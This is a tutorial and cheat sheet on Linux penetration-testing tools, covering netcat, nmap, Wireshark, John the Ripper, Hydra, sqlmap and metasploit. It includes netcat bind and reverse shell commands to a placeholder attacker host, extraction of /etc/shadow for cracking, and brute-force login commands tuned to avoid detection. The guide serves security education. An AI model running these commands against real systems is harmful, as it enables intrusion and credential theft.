# Security and Networking Tools

Complete guide to essential security, penetration testing, and networking tools for Linux systems.

## Table of Contents
- [Netcat](#netcat)
- [Nmap](#nmap)
- [Wireshark](#wireshark)
- [John the Ripper](#john-the-ripper)
- [Hydra](#hydra)
- [Additional Security Tools](#additional-security-tools)

---

## Netcat

### What is Netcat?

**The "Swiss Army knife" of networking.**

**Capabilities:**
- TCP/UDP connections
- Port scanning
- File transfers
- Remote shell
- Banner grabbing
- Chat/messaging

### Basic Usage

**Listen on port:**
```bash
# Listen for incoming connections
nc -l -p 1234

# Verbose output
nc -lvp 1234
# -l: listen mode
# -v: verbose
# -p: port
```

**Connect to host:**
```bash
nc example.com 80
nc 192.168.1.100 1234
```

### File Transfer

**Receiver (listening):**
```bash
nc -l -p 1234 > received_file.txt
```

**Sender:**
```bash
nc receiver_ip 1234 < file_to_send.txt
```

**Visual:**
```
Machine A (Receiver)          Machine B (Sender)
┌────────────────┐           ┌────────────────┐
│ nc -l -p 1234  │←─ TCP ──→ │ nc A_IP 1234   │
│ > file.txt     │  Port 1234│ < send.txt     │
└────────────────┘           └────────────────┘

Data flows: send.txt → file.txt
```

### Remote Shell (Bind Shell)

**Target machine (victim):**
```bash
# Bind shell - DANGEROUS!
nc -l -p 4444 -e /bin/bash
# Binds bash to port 4444
```

**Attacker machine:**
```bash
nc target_ip 4444
# Now has shell access to target
```

**Visual:**
```
Target                    Attacker
┌──────────────┐         ┌──────────────┐
│ nc -l -p 4444│         │ nc target_ip │
│ -e /bin/bash │←────────│ 4444         │
└──────────────┘         └──────────────┘
                Commands sent ────→
                ←──── Results returned
```

### Reverse Shell

**Attacker (listening):**
```bash
nc -l -p 4444
```

**Target (connects back):**
```bash
nc attacker_ip 4444 -e /bin/bash
```

**Why reverse shell:**
- Bypasses firewall (outbound usually allowed)
- Target initiates connection
- Attacker doesn't need open ports

### Port Scanning

```bash
# Scan single port
nc -zv example.com 80

# Scan port range
nc -zv example.com 20-25

# -z: zero I/O mode (scanning)
# -v: verbose

# Output:
# Connection to example.com 80 port [tcp/http] succeeded!
```

### Banner Grabbing

```bash
# Grab service banner
echo "" | nc -v example.com 22

# Output shows SSH version:
# SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5

# HTTP banner
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
```

### Chat Server

**Server:**
```bash
nc -l -p 1234
```

**Client:**
```bash
nc server_ip 1234
```

**Both can now type and send messages.**

---

## Nmap

### What is Nmap?

**Network Mapper - Port scanning and network discovery tool.**

**Capabilities:**
- Host discovery
- Port scanning
- Service detection
- OS detection
- Vulnerability scanning
- Network mapping

### Installation

```bash
sudo apt install nmap
```

### Basic Scanning

**Scan single host:**
```bash
nmap 192.168.1.1
```

**Scan multiple hosts:**
```bash
nmap 192.168.1.1 192.168.1.5 192.168.1.10
nmap 192.168.1.1-10
nmap 192.168.1.0/24
```

**Scan specific ports:**
```bash
nmap -p 80 192.168.1.1
nmap -p 80,443,22 192.168.1.1
nmap -p 1-1000 192.168.1.1
nmap -p- 192.168.1.1  # All ports (1-65535)
```

### Scan Types

**TCP Connect Scan (-sT):**
```bash
nmap -sT 192.168.1.1
# Completes 3-way handshake
# More reliable, but detectable
```

**SYN Scan (-sS) - Stealth:**
```bash
sudo nmap -sS 192.168.1.1
# Half-open scan
# Doesn't complete handshake
# Less detectable
# Requires root
```

**UDP Scan (-sU):**
```bash
sudo nmap -sU 192.168.1.1
# Scans UDP ports
# Slower than TCP
```

**Visual:**
```
TCP Connect Scan:
Scanner         Target
   │              │
   │─── SYN ─────→│
   │←── SYN-ACK ──│
   │─── ACK ─────→│ (Connection established)
   │─── RST ─────→│ (Close connection)

SYN Scan (Stealth):
Scanner         Target
   │              │
   │─── SYN ─────→│
   │←── SYN-ACK ──│
   │─── RST ─────→│ (No connection completed)
```

### Service and Version Detection

```bash
# Detect services
nmap -sV 192.168.1.1

# Example output:
# 22/tcp   open  ssh     OpenSSH 8.2p1
# 80/tcp   open  http    nginx 1.18.0
# 443/tcp  open  ssl/http nginx 1.18.0

# Aggressive scan (OS + version + scripts)
nmap -A 192.168.1.1
```

### OS Detection

```bash
sudo nmap -O 192.168.1.1

# Output includes:
# OS details: Linux 5.4
# Network Distance: 1 hop
```

### Timing and Performance

```bash
# Timing templates (0-5)
nmap -T0 192.168.1.1  # Paranoid (slowest)
nmap -T1 192.168.1.1  # Sneaky
nmap -T2 192.168.1.1  # Polite
nmap -T3 192.168.1.1  # Normal (default)
nmap -T4 192.168.1.1  # Aggressive
nmap -T5 192.168.1.1  # Insane (fastest)

# Fast scan (top 100 ports)
nmap -F 192.168.1.1
```

### Output Formats

```bash
# Normal output
nmap 192.168.1.1 -oN scan.txt

# XML output
nmap 192.168.1.1 -oX scan.xml

# Grepable output
nmap 192.168.1.1 -oG scan.gnmap

# All formats
nmap 192.168.1.1 -oA scan
```

### NSE Scripts

**Nmap Scripting Engine:**
```bash
# Run default scripts
nmap -sC 192.168.1.1

# Specific script
nmap --script=http-title 192.168.1.1

# Script category
nmap --script=vuln 192.168.1.1

# List scripts
ls /usr/share/nmap/scripts/
```

### Common Scan Examples

**Quick scan:**
```bash
nmap -T4 -F 192.168.1.0/24
```

**Comprehensive scan:**
```bash
sudo nmap -sS -sV -O -T4 -p- 192.168.1.1
```

**Vulnerability scan:**
```bash
nmap --script=vuln 192.168.1.1
```

---

## Wireshark

### What is Wireshark?

**Network protocol analyzer - captures and displays packet data.**

**Use cases:**
- Network troubleshooting
- Protocol analysis
- Security analysis
- Packet inspection

### Installation

```bash
sudo apt install wireshark
```

### Basic Usage

**Start Wireshark:**
```bash
sudo wireshark
```

**Capture on interface:**
1. Select interface (eth0, wlan0)
2. Click "Start Capturing"
3. Packets appear in real-time

### Display Filters

**Filter by protocol:**
```
http
https
dns
ssh
tcp
udp
icmp
```

**Filter by IP:**
```
ip.addr == 192.168.1.1
ip.src == 192.168.1.1
ip.dst == 192.168.1.100
```

**Filter by port:**
```
tcp.port == 80
tcp.port == 443
udp.port == 53
```

**Combined filters:**
```
ip.addr == 192.168.1.1 and tcp.port == 80
http and ip.src == 192.168.1.1
```

### Common Filters

```bash
# HTTP requests
http.request

# HTTP with specific method
http.request.method == "GET"
http.request.method == "POST"

# DNS queries
dns.flags.response == 0

# TCP handshake
tcp.flags.syn == 1

# Find passwords (plaintext)
http.request.method == "POST" and http contains "password"
```

### Follow Stream

**Right-click packet → Follow → TCP/UDP/HTTP Stream**

Shows complete conversation between client and server.

### Packet Analysis

**Packet structure:**
```
┌─────────────────────────┐
│ Frame (Physical Layer)  │
├─────────────────────────┤
│ Ethernet (Data Link)    │
├─────────────────────────┤
│ IP (Network Layer)      │
├─────────────────────────┤
│ TCP/UDP (Transport)     │
├─────────────────────────┤
│ Application Data        │
│ (HTTP, DNS, etc.)       │
└─────────────────────────┘
```

### Export Objects

**Export files from capture:**
```
File → Export Objects → HTTP
```

Extracts files transferred over HTTP (images, documents, etc.)

### Command Line (tshark)

```bash
# Capture packets
tshark -i eth0

# Capture and save
tshark -i eth0 -w capture.pcap

# Read capture file
tshark -r capture.pcap

# Filter and display
tshark -r capture.pcap -Y "http"
```

---

## John the Ripper

### What is John the Ripper?

**Password cracking tool.**

**Capabilities:**
- Dictionary attacks
- Brute force attacks
- Rainbow table attacks
- Hash cracking

### Installation

```bash
sudo apt install john
```

### Basic Usage

**Crack password hashes:**
```bash
# Single hash file
john hashes.txt

# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt
```

### Hash Formats

**Identify hash type:**
```bash
# MD5
5d41402abc4b2a76b9719d911017c592

# SHA-256
2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824

# bcrypt
$2b$12$KIXxLVE8XKXyHF.yZKZ5mO7x9Y...
```

**Specify format:**
```bash
john --format=raw-md5 md5hashes.txt
john --format=raw-sha256 sha256hashes.txt
john --format=bcrypt bcrypthashes.txt
```

### Crack Linux Passwords

**Extract hashes:**
```bash
sudo unshadow /etc/passwd /etc/shadow > passwords.txt
```

**Crack:**
```bash
john passwords.txt
```

### Attack Modes

**Dictionary Attack:**
```bash
john --wordlist=wordlist.txt hashes.txt
```

**Brute Force:**
```bash
john --incremental hashes.txt
```

**Wordlist with Rules:**
```bash
john --wordlist=wordlist.txt --rules hashes.txt
```

### Custom Wordlist

**Generate wordlist:**
```bash
# Create custom list
crunch 4 8 -o wordlist.txt
# 4-8 character words

# Use with John
john --wordlist=wordlist.txt hashes.txt
```

---

## Hydra

### What is Hydra?

**Network login cracker - brute force authentication.**

**Supports:**
- SSH, FTP, HTTP, HTTPS
- MySQL, PostgreSQL
- RDP, VNC
- And many more

### Installation

```bash
sudo apt install hydra
```

### Basic Syntax

```bash
hydra [options] [target] [service]
```

### SSH Brute Force

**Single username:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
```

**Multiple usernames:**
```bash
hydra -L users.txt -P passwords.txt ssh://192.168.1.1
```

**Verbose output:**
```bash
hydra -l admin -P passwords.txt ssh://192.168.1.1 -V
```

### FTP Brute Force

```bash
hydra -l ftpuser -P passwords.txt ftp://192.168.1.1
```

### HTTP Form Attack

**Web login:**
```bash
hydra -l admin -P passwords.txt \
  192.168.1.1 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# Format:
# /path:parameters:failure_string
```

### HTTP Basic Auth

```bash
hydra -L users.txt -P passwords.txt \
  192.168.1.1 http-get /admin/
```

### MySQL Brute Force

```bash
hydra -l root -P passwords.txt mysql://192.168.1.1
```

### Options

```bash
-l USER        # Single username
-L FILE        # Username list
-p PASS        # Single password
-P FILE        # Password list
-t TASKS       # Parallel tasks (default 16)
-V             # Verbose
-f             # Stop after first success
-s PORT        # Custom port
```

### Rate Limiting

```bash
# Slower scan (avoid detection)
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.1
```

---

## Additional Security Tools

### hashcat (GPU Password Cracking)

```bash
# Install
sudo apt install hashcat

# MD5 crack
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# SHA-256 crack
hashcat -m 1400 -a 0 hashes.txt wordlist.txt

# Brute force
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a
```

### aircrack-ng (WiFi)

```bash
# Monitor mode
sudo airmon-ng start wlan0

# Capture packets
sudo airodump-ng wlan0mon

# Crack WPA2
aircrack-ng -w wordlist.txt capture.cap
```

### sqlmap (SQL Injection)

```bash
# Install
sudo apt install sqlmap

# Test URL
sqlmap -u "http://example.com/page.php?id=1"

# Extract databases
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Dump table
sqlmap -u "http://example.com/page.php?id=1" -D database -T table --dump
```

### metasploit (Exploitation Framework)

```bash
# Start metasploit
msfconsole

# Search exploits
search apache

# Use exploit
use exploit/unix/webapp/php_cgi_arg_injection

# Set options
set RHOST 192.168.1.1
set LHOST 192.168.1.100

# Run exploit
exploit
```

### nikto (Web Server Scanner)

```bash
# Install
sudo apt install nikto

# Scan web server
nikto -h http://example.com

# Scan specific port
nikto -h http://example.com -p 8080
```

### gobuster (Directory Brute Force)

```bash
# Install
sudo apt install gobuster

# Directory scan
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt

# DNS subdomain scan
gobuster dns -d example.com -w subdomains.txt
```

---

## Quick Reference

### Netcat
```bash
nc -l -p 1234              # Listen
nc host 1234               # Connect
nc -l -p 1234 > file       # Receive file
nc host 1234 < file        # Send file
```

### Nmap
```bash
nmap 192.168.1.1           # Basic scan
nmap -p 80,443 host        # Specific ports
nmap -sV host              # Service detection
nmap -O host               # OS detection
```

### Wireshark Filters
```
http
ip.addr == 192.168.1.1
tcp.port == 80
http.request.method == "POST"
```

### John the Ripper
```bash
john hashes.txt                  # Crack
john --wordlist=list.txt hash    # Dictionary
john --show hashes.txt           # Show results
```

### Hydra
```bash
hydra -l user -P pass.txt ssh://host
hydra -L users.txt -P pass.txt ftp://host
```

---

This guide covers essential security and networking tools for penetration testing and system administration.